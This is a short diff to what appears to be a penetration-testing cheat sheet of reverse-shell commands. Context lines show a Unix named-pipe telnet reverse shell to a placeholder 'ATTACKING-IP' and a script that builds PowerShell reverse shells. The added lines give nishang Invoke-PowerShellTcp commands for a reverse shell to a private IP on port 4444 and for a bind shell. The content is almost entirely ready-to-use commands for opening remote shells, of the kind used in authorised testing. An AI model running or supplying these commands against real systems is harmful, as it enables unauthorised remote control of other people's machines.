@@ -70,6 +70,12 @@ rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
 ## WINDOWS
 #### COMON
 ````
+nishang
+/opt/windows/nishang/Shells/
+Invoke-PowerShellTcp.ps1 
+Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
+Invoke-PowerShellTcp -Bind -Port 4444
+
 python /opt/windows/mkpsrevshell.py                            
 USAGE: mkpsrevshell.py IP PORT
 
